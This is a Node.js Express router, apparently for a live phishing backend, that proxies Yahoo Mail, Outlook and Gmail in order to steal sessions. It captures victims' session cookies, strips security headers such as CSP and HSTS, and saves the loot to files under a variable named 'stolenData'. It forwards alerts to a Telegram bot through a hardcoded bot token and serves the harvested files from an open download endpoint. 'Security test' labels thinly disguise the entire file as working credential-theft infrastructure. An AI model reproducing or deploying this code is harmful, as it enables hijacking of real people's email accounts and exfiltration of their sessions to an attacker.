const express = require("express");
const fetch = require("node-fetch");
const geoip = require('geoip-lite');
const UAParser = require('ua-parser-js');
const fs = require('fs').promises;
const path = require('path');
const router = express.Router();

// ==================== SECURITY CONFIGURATION ====================
const rateLimit = require("express-rate-limit");
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100
});
router.use(limiter);

// ==================== CONFIGURATION ====================
const BOT_TOKEN = process.env.BOT_TOKEN || "6808029671:AAGCyAxWwDfYMfeTEo9Jbc5-PKYUgbLLkZ4";
const CHAT_ID = process.env.CHAT_ID || process.env.CAT_ID || "6068638071";

const TELEGRAM_API = BOT_TOKEN ? `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage` : null;
const COOKIES_DIR = path.join(__dirname, '../data/cookies');

// ==================== PROXY CONFIGURATION ====================
const PROXY_TARGETS = {
  'yahoo': {
    baseUrl: 'https://mail.yahoo.com',
    name: 'Yahoo Mail',
    cookieDomains: ['.yahoo.com', '.mail.yahoo.com']
  },
  'outlook': {
    baseUrl: 'https://outlook.live.com', 
    name: 'Outlook',
    cookieDomains: ['.live.com', '.outlook.com']
  },
  'gmail': {
    baseUrl: 'https://mail.google.com',
    name: 'Gmail',
    cookieDomains: ['.google.com', '.gmail.com']
  }
};

// ==================== SECURITY UTILITIES ====================
function sanitizeFilename(filename) {
  return filename.replace(/[^a-zA-Z0-9._-]/g, '_');
}

function validateInput(data) {
  if (!data || typeof data !== 'object') {
    throw new Error('Invalid data format');
  }
  
  if (data.type === 'session_capture' && !data.data) {
    throw new Error('Session capture requires data field');
  }
  
  return true;
}

// ==================== CORE FUNCTIONS ====================
async function ensureDataDir() {
  try {
    await fs.access(COOKIES_DIR);
  } catch (error) {
    await fs.mkdir(COOKIES_DIR, { recursive: true });
    console.log('Created data directory:', COOKIES_DIR);
  }
}

async function sendTelegramMessage(message) {
  if (!TELEGRAM_API) {
    console.warn('Telegram API not configured');
    return { success: false, error: 'Not configured' };
  }

  try {
    console.log('Sending Telegram message...');
    
    const response = await fetch(TELEGRAM_API, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      })
    });

    const result = await response.json();
    
    if (!response.ok) {
      throw new Error(`Telegram API error: ${result.description || response.statusText}`);
    }

    return { success: true, data: result };
    
  } catch (error) {
    console.error('Telegram send error:', error.message);
    return { 
      success: false, 
      error: error.message
    };
  }
}

async function createDataFile(data) {
  await ensureDataDir();
  
  const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
  const testType = data.type || 'security_test';
  
  const targetDomain = extractDomain(data.url || data.data?.url || 'unknown');
  const filename = `${testType}_${targetDomain}_${timestamp}.json`;
  const safeFilename = sanitizeFilename(filename);
  const filepath = path.join(COOKIES_DIR, safeFilename);
  
  await fs.writeFile(filepath, JSON.stringify(data, null, 2));
  console.log('Data file created:', safeFilename);
  return { filename: safeFilename, filepath };
}

function extractDomain(url) {
  try {
    if (!url || url === 'N/A') return 'unknown';
    const domain = new URL(url).hostname;
    return domain.replace(/^www\./, '').replace(/\./g, '_');
  } catch (error) {
    return 'unknown';
  }
}

// ==================== PROXY FUNCTIONS ====================
async function proxyRequest(target, path, req, res) {
  console.log(`🔄 Proxying to ${target.name}: ${path}`);
  
  const targetUrl = `${target.baseUrl}${path}`;
  const ip = req.ip || req.connection.remoteAddress || 'Unknown';
  
  try {
    // Forward request to target
    const targetResponse = await fetch(targetUrl, {
      headers: {
        ...req.headers,
        host: new URL(target.baseUrl).hostname,
        origin: target.baseUrl,
        referer: target.baseUrl
      },
      method: req.method,
      body: req.method !== 'GET' && req.method !== 'HEAD' ? req.body : undefined,
      redirect: 'manual'
    });

    // 🍪 CAPTURE COOKIES FROM TARGET
    const setCookieHeader = targetResponse.headers.get('set-cookie');
    if (setCookieHeader) {
      console.log(`🎯 CAPTURED ${target.name} COOKIES:`, setCookieHeader);
      
      await storeProxyCookies(target.name, ip, setCookieHeader, targetUrl);
    }

    // Also capture cookies sent by user
    const userCookies = req.headers.cookie;
    if (userCookies) {
      console.log(`🎯 USER ${target.name} COOKIES:`, userCookies);
      
      const hasSession = target.cookieDomains.some(domain => 
        userCookies.includes(domain.replace('.', ''))
      );
      
      if (hasSession) {
        await storeUserSessionCookies(target.name, ip, userCookies, targetUrl);
      }
    }

    // Handle redirects
    if (targetResponse.status >= 300 && targetResponse.status < 400) {
      const location = targetResponse.headers.get('location');
      if (location) {
        console.log(`🔀 Redirecting to: ${location}`);
        return res.redirect(targetResponse.status, `/chukachina/proxy/${target.name}${location}`);
      }
    }

    // Forward response headers
    const headers = { ...targetResponse.headers.raw() };
    delete headers['content-security-policy'];
    delete headers['x-frame-options'];
    delete headers['strict-transport-security'];
    
    Object.keys(headers).forEach(key => {
      res.setHeader(key, headers[key]);
    });

    res.status(targetResponse.status);
    
    const buffer = await targetResponse.buffer();
    res.send(buffer);

  } catch (error) {
    console.error(`Proxy error for ${target.name}:`, error);
    res.status(500).json({
      success: false,
      message: `Proxy error: ${error.message}`,
      target: target.name
    });
  }
}

async function storeProxyCookies(target, ip, cookies, url) {
  const stolenData = {
    type: 'proxy_cookie_capture',
    target: target,
    ip: ip,
    captured_cookies: cookies,
    url: url,
    timestamp: new Date().toISOString(),
    note: `Captured via ${target} proxy`
  };
  
  await createDataFile(stolenData);
  
  const message = `🍪 <b>PROXY COOKIE CAPTURE</b>

🎯 <b>Target:</b> ${target}
📊 <b>Cookies Captured:</b> Yes
🔗 <b>URL:</b> ${url}

📍 <b>Client Info:</b>
├ IP: <code>${ip}</code>
├ Time: ${new Date().toISOString()}
└ Method: Server-side proxy

⚠️ <b>Session cookies intercepted from ${target}</b>`;

  await sendTelegramMessage(message);
}

async function storeUserSessionCookies(target, ip, cookies, url) {
  const sessionData = {
    type: 'user_session_detected',
    target: target,
    ip: ip,
    user_cookies: cookies,
    url: url,
    timestamp: new Date().toISOString(),
    note: `User had existing ${target} session`
  };
  
  await createDataFile(sessionData);
  
  const message = `🔐 <b>EXISTING SESSION DETECTED</b>

🎯 <b>Target:</b> ${target}
📊 <b>User Session:</b> Active
🔗 <b>URL:</b> ${url}

📍 <b>Client Info:</b>
├ IP: <code>${ip}</code>
├ Time: ${new Date().toISOString()}
└ Status: Already logged in

⚠️ <b>User has active ${target} session</b>`;

  await sendTelegramMessage(message);
}

// ==================== FIXED PROXY ROUTES ====================

// Option 1: Simple approach - handle all paths after /proxy/:target
router.use('/proxy/:target', async (req, res) => {
  const targetName = req.params.target;
  
  // Extract the path after /proxy/:target
  const originalUrl = req.originalUrl;
  const basePath = `/chukachina/proxy/${targetName}`;
  const path = originalUrl.replace(basePath, '') || '/';
  
  const target = PROXY_TARGETS[targetName];
  if (!target) {
    return res.status(404).json({
      success: false,
      message: `Proxy target not found: ${targetName}`,
      available: Object.keys(PROXY_TARGETS)
    });
  }
  
  await proxyRequest(target, path, req, res);
});

// ==================== DOWNLOAD ROUTES ====================
router.get('/download/:filename', async (req, res) => {
  try {
    const filename = req.params.filename;
    const safeFilename = sanitizeFilename(filename);
    if (safeFilename !== filename) {
      return res.status(400).json({ 
        success: false, 
        message: "Invalid filename" 
      });
    }
    
    const filepath = path.join(COOKIES_DIR, safeFilename);
    
    try {
      await fs.access(filepath);
    } catch (error) {
      return res.status(404).json({ 
        success: false, 
        message: "File not found"
      });
    }
    
    res.setHeader('Content-Type', 'application/json');
    res.setHeader('Content-Disposition', `attachment; filename="${safeFilename}"`);
    
    const fileContent = await fs.readFile(filepath, 'utf8');
    res.send(fileContent);
    
  } catch (error) {
    console.error('Error downloading file:', error);
    res.status(500).json({ 
      success: false, 
      message: "Error downloading file"
    });
  }
});

// ==================== MAIN ENDPOINT ====================
router.post('/', async (req, res) => {
  try {
    console.log('=== SECURITY TEST DATA RECEIVED ===');
    
    if (!req.body || typeof req.body !== 'object') {
      return res.status(400).json({ 
        success: false, 
        message: "Invalid request body" 
      });
    }
    
    try {
      validateInput(req.body);
    } catch (validationError) {
      return res.status(400).json({
        success: false,
        message: validationError.message
      });
    }
    
    const data = req.body;
    const ip = req.ip || req.connection.remoteAddress || 'Unknown';
    const location = geoip.lookup(ip);
    const locationStr = location ? `${location.city || 'N/A'}, ${location.country || 'N/A'}` : 'Unknown';

    const userAgent = data.userAgent || data.user_agent || req.headers['user-agent'] || '';
    const parser = new UAParser(userAgent);
    const agent = parser.getResult();
    const deviceType = `${agent.os.name || 'OS'} ${agent.os.version || ''} - ${agent.browser.name || 'Browser'} ${agent.browser.version || ''}`;

    const targetUrl = data.url || data.data?.url || data.dataCollected?.url || 'N/A';
    const targetDomain = extractDomain(targetUrl);

    let fileInfo = null;
    try {
      fileInfo = await createDataFile(data);
    } catch (fileError) {
      console.error('Error creating data file:', fileError);
    }

    // Send Telegram notification
    const telegramResult = await sendTelegramMessage(
      `📥 <b>NEW SECURITY TEST DATA</b>\n\nType: ${data.type || 'unknown'}\nTarget: ${targetDomain}\nIP: ${ip}`
    );
    
    if (!telegramResult.success) {
      console.error('Failed to send Telegram notification:', telegramResult.error);
    }

    console.log('📥 New Security Test Data:', data.type, targetDomain, ip);

    res.status(200).json({
      success: true,
      message: "Security test data received successfully",
      dataType: data.type,
      targetDomain: targetDomain,
      telegramSent: telegramResult.success,
      clientInfo: {
        ip: ip,
        location: locationStr,
        device: deviceType
      },
      downloadInfo: fileInfo ? {
        filename: fileInfo.filename,
        downloadUrl: `https://chuksinno-backend-1.onrender.com/chukachina/download/${fileInfo.filename}`
      } : null,
      proxyInfo: {
        available: true,
        targets: Object.keys(PROXY_TARGETS),
        yahooProxy: 'https://chuksinno-backend-1.onrender.com/chukachina/proxy/yahoo'
      },
      timestamp: new Date().toISOString()
    });

  } catch (error) {
    console.error("Error in security test endpoint:", error);
    res.status(500).json({
      success: false,
      message: "Internal server error",
      error: error.message
    });
  }
});

// ==================== PROXY INFO ENDPOINT ====================
router.get('/proxy-info', (req, res) => {
  res.json({
    success: true,
    message: "Proxy endpoints available",
    proxies: Object.keys(PROXY_TARGETS).map(key => ({
      name: key,
      target: PROXY_TARGETS[key].name,
      url: `https://chuksinno-backend-1.onrender.com/chukachina/proxy/${key}`,
      baseUrl: PROXY_TARGETS[key].baseUrl
    }))
  });
});

// Health check endpoint
router.get('/health', async (req, res) => {
  try {
    await ensureDataDir();
    
    res.json({
      success: true,
      message: "Security test endpoint is running",
      timestamp: new Date().toISOString(),
      features: {
        dataCollection: true,
        telegramNotifications: !!TELEGRAM_API,
        fileStorage: true,
        downloadEndpoint: true,
        proxyEndpoints: true,
        availableProxies: Object.keys(PROXY_TARGETS)
      }
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: "Health check failed",
      error: error.message
    });
  }
});

module.exports = router;